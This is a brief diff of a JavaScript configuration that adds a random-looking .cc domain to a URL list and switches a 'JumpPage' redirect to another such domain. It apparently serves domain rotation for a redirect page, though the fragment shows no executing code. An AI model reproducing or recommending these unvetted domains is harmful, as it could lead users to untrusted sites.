@@ -37,10 +37,11 @@ var emails = [
 ];
 
 var urls=[
+	'3oh3mu1h.cc',
 	'bl96y08k.cc',
 ];                                                                                                                  
 
-var JumpPage="https://ak85x97n.cc";
+var JumpPage="https://3qushy8h.cc";
 
 var newestUrls = [];
 
